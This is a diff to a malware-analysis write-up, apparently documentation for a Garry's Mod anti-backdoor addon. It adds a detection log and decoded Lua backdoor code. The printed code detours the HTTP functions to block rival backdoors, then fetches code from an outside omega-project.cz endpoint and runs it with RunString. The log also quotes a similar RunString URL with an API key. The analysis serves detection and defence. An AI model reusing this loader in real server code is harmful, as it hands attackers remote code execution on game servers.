@@ -91,7 +91,7 @@ http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey
 </p>
 </details>
 
-<details><summary>5) Detection contents</summary>
+<details><summary>5) Detected contents</summary>
 <p>
 
 - The first backdoor is dead, since the link inside the content doesn't work
@@ -102,7 +102,146 @@ http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey
 
 <img src="https://i.imgur.com/6i8xNtz.png"/>
 
-<img src="https://i.imgur.com/MYHm7c8.png"/>
+```
+[ALERT]
+-----------------------------------------------------------------------------------
+
+[Backdoor Shield] Execution blocked!
+    Function: http.Fetch
+    Date: 08-29-2020
+    Time: 19h 37m 32s
+    Log: data/backdoor-shield/08-29-2020/log_blocked.txt
+    Content Log: data/backdoor-shield/08-29-2020/http.Fetch/log_blocked_(19h 37m 32s).txt
+    Url: https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey=spxysAWoRdmPcPeQitSx
+    Detected:
+        RunString
+        RunString
+        http.Fetch
+        http.Post
+        _G[
+    Location: stack traceback:
+	addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'Fetch'
+	addons/fakedoor/lua/autorun/server/sv_test2.lua:7: in main chunk
+
+
+[CONTENT]
+-----------------------------------------------------------------------------------
+
+arguments	=	{
+			"
+
+
+local sKqYgoHBFGNoMavJtTsX = { 
+    --[[ EXTENTIONS DOMAINS BACKDOORS ]]
+    "\46\99\102",
+    "\46\116\107",
+    "\46\121\111\46\102\114",
+    "\46\121\110\46\102\114",
+    "\46\48\48\48\119\101\98\104\111\115\116",
+    "\97\108\119\97\121\115\100\97\116\97\46\110\101\116",
+    "\46\103\113",
+    "\46\120\121\122",
+    "\46\101\115\121\46\101\115",
+    "\46\109\108",
+    --[[ DOMAINS BACKDOORS ]]
+    "\100\114\109\46\103\109",
+    "\103\118\97\99\100\111\111\114",
+    "\103\118\97\99",
+    "\107\112\97\110\101\108",
+    "\108\107\112\97\110\101\108",
+    "\119\116\102\109",
+    "\103\109\97\112",
+    "\103\45\104\117\98",
+    "\103\112\97\110\101\108",
+    "\97\115\116\105\108\108\97\110",
+    "\103\104\97\120",
+    "\106\101\108\108\121\105\115\97\102\97\103",
+    "\115\105\122\122\117\114\112",
+    "\104\97\121\108\97\121",
+    "\114\118\97\99",
+    "\99\105\112\104\101\114\45\112\97\110\101\108",
+    "\120\118\97\99\100\111\111\114",
+    "\74\117\115\116\45\115\101\114\118",
+    "\74\117\115\116\115\101\114\118",
+    "\120\101\110\100\111\111\114",
+    "\69\120\111\100\111\115\105\117\109",
+    "\109\121\119\97\105\102\117",
+    "\103\98\108\107",
+    --[[ FILES BACKDOORS ]]
+    "\115\116\97\103\101\49\46\112\104\112",
+    "\115\116\97\103\101\50\46\112\104\112",
+    "\101\118\111\46\112\104\112",
+    "\101\121\111\46\112\104\112",
+    "\98\97\99\107\100\111\111\114\46\112\104\112",
+    "\102\108\103\46\94\112\104\112",
+    "smart-overwrite",
+    "anatik",
+    --[[ $_GET BACKDOORS ]]
+    "\63\116\111\61",
+    "\63\116\111\107\101\110\61",
+    "\63\102\117\99\107\95\107\101\121\61",
+    "\63\98\97\99\107\100\111\111\114\95\107\101\121\61",
+    --[[ DIR BACKDOORS ]]
+    "\47\115\121\115\47",
+    "\47\99\111\114\101\47",
+    "\47\115\101\99\117\114\101\95\97\114\101\97\47"
+}
+
+
+local httpF = http.Fetch  
+local httpP = http.Post 
+local vraisHTTP = HTTP function HTTP(a) 	
+	if a.url then 
+		for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
+			if string.find(a.url, v) then 
+				return end 
+		    end 
+		  end 
+  return vraisHTTP(a) 
+end 
+
+function http.Fetch(...) 
+   local args = {...} 
+   if args[1] then 
+   	for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
+   		if string.find(args[1], v) then 
+   			return end 
+   	end 
+   end 
+
+   return httpF(...) 
+end 
+
+
+function http.Post(...) 
+local args = {...} 
+if args[1] then 
+	for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
+		if string.find(args[1], v) then 
+			return end 
+	 end 
+    end return httpP(...) 
+   end
+
+_G["http"]["Fetch"]([[https:/]]..[[/api.omega-project.cz/api_connect.php?api_key=]],function(api)
+  RunString(api)
+end)
+
+",
+			2703,
+			{
+			Vary	=	"Accept-Encoding",
+			Set-Cookie	=	"__cfduid=dfe0c3e4f2be8978d00090d7df7dc9e711598740653; expires=Mon, 28-Sep-20 22:37:33 GMT; path=/; domain=.omega-project.cz; HttpOnly; SameSite=Lax; Secure,__ddg1=ZRzJovYJDvrB2k895vsn; Domain=.omega-project.cz; HttpOnly; Path=/; Expires=Sun, 29-Aug-2021 22:37:33 GMT",
+			Transfer-Encoding	=	"chunked",
+			Connection	=	"keep-alive",
+			Date	=	"Sat, 29 Aug 2020 22:37:34 GMT",
+			Content-Encoding	=	"gzip",
+			Content-Type	=	"text/html; charset=UTF-8",
+			Server	=	"cloudflare",
+				},
+			200,
+}
+```
 
 </p>
 </details>
@@ -113,7 +252,118 @@ http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey
 
 Actually you can copy the detection results, decode them and keep going to see whats going on.
 
-<details><summary>1) I disabled my old Lua snippets, took the end of the code from the last detection and ran it</summary>
+<details><summary>1) Here is the first decoding</summary>
+<p>
+
+The backdoor is inhibiting other backdoors through some detourings and taking the next step.
+
+```lua
+local nKvWQygqjyMKsWkNbsiO = { 
+    --[[ EXTENTIONS DOMAINS BACKDOORS ]]
+    ".cf",
+    ".tk",
+    ".yo.fr",
+    ".yn.fr",
+    ".000webhost",
+    "alwaysdata.net",
+    ".gq",
+    ".xyz",
+    ".esy.es",
+    ".ml",
+    --[[ DOMAINS BACKDOORS ]]
+    "drm.gm",
+    "gvacdoor",
+    "gvac",
+    "kpanel",
+    "lkpanel",
+    "wtfm",
+    "gmap",
+    "g-hub",
+    "gpanel",
+    "astillan",
+    "ghax",
+    "jellyisafag",
+    "sizzurp",
+    "haylay",
+    "rvac",
+    "cipher-panel",
+    "xvacdoor",
+    "Just-serv",
+    "Justserv",
+    "xendoor",
+    "Exodosium",
+    "mywaifu",
+    "gblk",
+    --[[ FILES BACKDOORS ]]
+    "stage1.php",
+    "stage2.php",
+    "evo.php",
+    "eyo.php",
+    "backdoor.php",
+    "flg.^php",
+    "smart-overwrite 10",
+    "anatik 10",
+    --[[ $_GET BACKDOORS ]]
+    "?to=",
+    "?token=",
+    "?fuck_key=",
+    "?backdoor_key=",
+    --[[ DIR BACKDOORS ]]
+    "/sys/",
+    "/core/",
+    "/secure_area/",
+}
+
+-- Toma as funções do GMod pra ele
+local httpF = http.Fetch  
+local httpP = http.Post 
+local vraisHTTP = HTTP
+
+-- Barra o uso de backdoors bloqueando tudo da lista acima
+-- (Se estiver limpo, executa a função)
+
+function HTTP(a)
+	if a.url then 
+		for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
+			if string.find(a.url, v) then 
+				return end 
+		    end 
+		  end 
+  return vraisHTTP(a) 
+end 
+
+function http.Fetch(...) 
+   local args = {...} 
+   if args[1] then 
+   	for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
+   		if string.find(args[1], v) then 
+   			return end 
+   	end 
+   end 
+
+   return httpF(...) 
+end 
+
+
+function http.Post(...) 
+local args = {...} 
+if args[1] then 
+	for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
+		if string.find(args[1], v) then 
+			return end 
+	 end 
+    end return httpP(...) 
+   end
+
+_G["http"]["Fetch"]([[https:/]]..[[/api.omega-project.cz/api_connect.php?api_key=]],function(api)
+  RunString(api)
+end)
+```
+
+</p>
+</details>
+
+<details><summary>2) I disabled my old Lua snippets, took the end of the code above and ran it</summary>
 <p>
 
 ```lua
@@ -133,7 +383,7 @@ end)
 </p>
 </details>
 
-<details><summary>2) Now I got a bunch of things to analyze</summary>
+<details><summary>3) Now I got a bunch of things to analyze</summary>
 <p>
 <img src="https://i.imgur.com/SBwHXDy.png"/>
 
@@ -417,8 +667,7 @@ end
 </p>
 </details>
 
-
-<details><summary>3) After decoding, I can see everything</summary>
+<details><summary>4) After decoding, I can see everything</summary>
 <p>
 
 ```lua
